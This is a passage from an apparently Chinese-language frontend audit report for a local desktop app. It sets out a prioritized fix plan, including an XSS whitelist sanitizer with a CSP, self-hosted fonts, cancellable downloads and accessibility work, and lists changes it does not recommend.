| **B1** | `mdToHtml` 的 HTML 直通改为 DOMParser **白名单重建**（表/列表/p/标题，属性仅 colspan/rowspan），删掉 `HTML_DANGEROUS_RE`；配合后端给 HTML 加 CSP（`script-src 'self'; object-src 'none'; frame-src 'none'`） | 高：关掉唯一 XSS 通道（S1-S4） | 低（表格渲染需回归） | `_work/md_probe.js` 9 条 payload 全 false；现有 md 样例表格渲染一致 |
| **B2** | 字体自托管（或删自定义字体）；`index.html:8-10` 去掉外域 | 大：离线可用 + 符合「不出本机」 | 低（体积 +100 KB 上限） | 断网启动不再空白 |
| **B3** | `bridge.js` 的 `settle()` 挂 `DOMContentLoaded` 而非 `window load`；`API.ready` 失败时给明确 UI 状态 | 大：首屏不被网络阻塞 | 低 | 屏蔽外网后启动，SSE/状态应立即就绪 |
| **B4** | 缩放改 `document.documentElement.style.zoom`（或改 CSS 变量化），保持设置项可用 | 大：修复宣称功能 F1 | 低（WebView2 支持 zoom） | 150% 档视觉放大、布局不破 |
| **B5** | 模型下载区加「取消」按钮 → `API.cancel()`；SSE `pct=0` 复位 | 大：6.8 GB 可中止（F2） | 低（后端已就绪） | 起下载→取消→状态复位 |
| **B6** | `pushSettings` 累积 patch（保留同一 debounce 窗口内的多次修改） | 中：修掉「250 ms 内连点两个设置，前一个丢失」（`app.js:765-775`） | 低 | 连点 device+theme，重读 `/api/settings` 两项都在 |
| **B7** | `bridge` 失败路径返回 `{ok:false,error}`；调用点补 `?.`/try | 中：消除静默 TypeError（C2） | 低 | 断网点按钮，无控制台报错 |
| **B8** | 失败批量项可点开完整错误 + 「重试失败项」；失败项去掉「查看 ›」 | 中高：用户可自救（F4） | 低 | 坏文件 + 好文件混跑 |
| **B9** | `#md-raw` 去 `readonly`，编辑回写 `state.lastResult` 并标记「已编辑」 | 高：核心工作流（F8） | 低（注意 pages/分页同步） | 改字→预览/保存一致 |
| **B10** | 隐藏「卸载模型」假按钮，或改为「重启以卸载」 | 中：去掉虚假能力（F3） | 低 | 点击无承诺落差 |
| **B11** | 错误统一到顶部 banner + `scrollIntoView`（复用 `banner-warn`） | 中：错误可见（F10） | 低 | 停 server 点识别 |
| **B12** | 结果区补字数、历史项显示时间、复制按钮文案随页标签联动 | 小中：信息完整性（F9/F13/F14） | 低 | 逐项肉眼核对 |
| **B13** | 最小键盘集：Ctrl+Enter 开始、Esc 取消、`#model-status`→`<button>`、`.hx` 补 keydown、`#drop` role/tabindex+Enter | 中：无障碍（F11/F12） | 低 | 纯键盘走一遍 |
| **B14** | 文档级 `dragover/drop` 兜底 `preventDefault` | 中：防误拖导致导航（F6） | 低 | 拖到结果区不跳转 |
| **B15** | `retranslate` 补 `renderProbeResult`；mock 模式常驻横幅；删 `API.shutdown`/`#view-ctx` 死代码 | 小中：一致性与可信度（A2/I2/P3/C1/F17） | 低 | 语言切换、关 server 启动 |

**预估**：B3/B4/B5/B10/B15 约 0.5–1 天；B6/B7/B12/B14 约半天；B8/B9/B11/B13 约 1–1.5 天；B1 需 1 天（含表格回归）；B2 需 0.5 天（含字体重排）。

---

## 9. 不建议做

| 事项 | 理由 |
|---|---|
| 引入 React/Vue/构建链 | 全部前端 2.5k 行、零依赖；收益不抵打包/调试成本，且现有「innerHTML+委托」模式没有明显性能问题 |
| 引入通用 `marked`+`DOMPurify` 替代自研渲染 | 会成为首个运行时第三方依赖（需打包/离线校验）；自研渲染对模型输出的表格/标题已够用，**白名单消毒 40 行内可完成**（B1） |
| Markdown 虚拟滚动/分片渲染 | 实测 1 MB = 24.8 ms，不是瓶颈；真实成本在布局，先埋点再谈（R1） |
| 把 `md-render` 换成 iframe 隔离 | 会丢掉复制/查找/主题继承，且引入跨文档通信复杂度；CSP+白名单更划算 |
| 把 Mock 层重写成完整后端仿真 | 只为 file:// 设计预览存在；保留最小集 + 常驻横幅即可（P3/C5） |
| 自研「取消/进度」轮询兜底 | SSE 已覆盖，加轮询只会引入双源竞态；真正缺的是「SSE 重连后补一次 `/api/status`」（`bridge.js:52` 的 `onerror` 为空，`onopen` 未注册）——这一项本身值得做，见下 |
| 国际化框架（i18next 等） | 现有 236 键、0 缺键、动态语言发现已可用；框架引入的成本（打包、复数规则）大于收益 |

> 上面「不建议」里唯一例外：`bridge.js:45-54` 的 EventSource **没有 `onopen` 补拉状态**。断线重连后模型状态/进度可能永久陈旧，建议加 3 行（`es.onopen = () => API.getStatus().then(applyStatus)`）——这属于低风险修正，可并入 B7。

---

## 10. 建议优先级（如果要只改 3 件事）

1. **B1（XSS 白名单 + CSP）**：唯一可被外部输入触发、能跨越「本机 API 边界」的问题；修复面小、可回归。
2. **B2+B3（字体本地化 + 传输层不等 `load`）**：直接决定「打开就能用」；当前在受限网络下可能长时间空白/无数据，属于可用性事故级。
3. **B5/B9（下载可取消 + 结果可编辑）**：两个最高频的用户挫败点，后端已就绪、改动局限在 `app.js`。

---

## 附：复现脚本（临时文件，非项目资源）

- `D:\Project\_work\i18n_check.js`：locale 键集/占位符/使用点/中文硬编码/CSS 统计。
- `D:\Project\_work\md_probe.js`：从 `app.js` 抽出 `mdToHtml`/`mdToPlain` 原函数，跑 9 条 payload（输出 `RAW_SINK_ACCEPTED`）与 100 KB/500 KB/1 MB 基准。

> 两个脚本位于项目目录之外，不纳入版本库；如需长期回归，建议移到 `tools/`（需另开任务，本报告未改动任何代码）。
